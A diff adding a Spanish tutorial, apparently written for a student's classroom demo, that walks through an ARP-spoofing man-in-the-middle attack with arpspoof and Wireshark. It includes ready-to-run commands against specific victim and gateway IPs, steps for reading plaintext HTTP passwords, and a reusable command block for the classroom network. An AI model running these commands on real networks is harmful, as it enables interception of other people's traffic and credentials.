@@ -1,0 +1,58 @@
+Paso 1: Preparar el terreno en tu Kali (El Atacante)
+Por defecto, si interceptas el tráfico de la otra máquina, internet se le va a cortar y el profe se va a dar cuenta. Para evitarlo, tienes que decirle al Kernel de tu Kali que actúe como un router y reenvíe los paquetes.
+
+Abre una terminal en Kali y escribe:
+
+Bash
+sudo sysctl -w net.ipv4.ip_forward=1
+(Si te sale = 1, ya estás listo).
+
+⚔️ Paso 2: Lanzar el Ataque de Envenenamiento ARP
+Para este ataque necesitas saber tres IPs: tu interfaz de red (suele ser eth0), la IP de la víctima (192.168.18.122 según tu captura anterior) y la IP del Router/Gateway (que normalmente es la .1, por ejemplo 192.168.18.1).
+
+💡 Nota: Si no sabes la IP del router, búscala rápido en la terminal con el comando: ip route show (es la que dice default via).
+
+Abre dos pestañas en la terminal de tu Kali:
+
+En la Pestaña 1 (Engañar a la víctima): Le decimos a la víctima que nosotros somos el router.
+
+Bash
+sudo arpspoof -i eth0 -t 192.168.18.122 192.168.18.1
+En la Pestaña 2 (Engañar al router): Le decimos al router que nosotros somos la víctima.
+
+Bash
+sudo arpspoof -i eth0 -t 192.168.18.1 192.168.18.122
+Verás que ambas pestañas empiezan a mandar paquetes sin parar. No las cierres, déjalas corriendo.
+
+👁️ Paso 3: Alzar la Red de Espionaje (Wireshark)
+Ahora que estás en el medio, vamos a ver pasar los datos.
+
+Abre una tercera terminal en Kali y escribe: sudo wireshark &
+
+Selecciona tu interfaz de red (eth0) y dale doble clic para empezar a capturar.
+
+En la barra de filtros de arriba, escribe para ver solo lo de la víctima:
+
+Plaintext
+ip.addr == 192.168.18.122
+🚀 La Hora de la Verdad: La demostración
+Ve a la Máquina Víctima (la otra máquina) e intenta navegar en internet o hacer un ping.
+
+Verás que en tu pantalla de Wireshark en Kali empiezan a llover paquetes de color azul, verde y negro. ¡Estás interceptando absolutamente todo lo que esa máquina hace en tiempo real!
+
+Si en la víctima abres una página web antigua que use HTTP (sin la S de seguro, como http://neverssl.com) e inicias sesión con cualquier usuario y contraseña falsos, podrás ir a Wireshark, buscar el paquete que diga POST, darle clic derecho -> Follow -> TCP Stream, y verás la contraseña en texto plano. ¡Eso va a destruir el cerebro del profe!
+
+📂 Guarda los comandos para mañana
+Para tu "script de despliegue rápido con un solo comando", guarda este bloque de texto en tu archivo de apuntes en la nube para que solo tengas que copiar y pegar las líneas:
+
+Plaintext
+# --- CASO 2: MAN IN THE MIDDLE ---
+# 1. Habilitar Forwarding:
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# 2. Ataque (Reemplazar IPs según el aula):
+# Ventana 1: sudo arpspoof -i eth0 -t <IP_VICTIMA> <IP_ROUTER>
+# Ventana 2: sudo arpspoof -i eth0 -t <IP_ROUTER> <IP_VICTIMA>
+
+# 3. Escucha:
+sudo wireshark
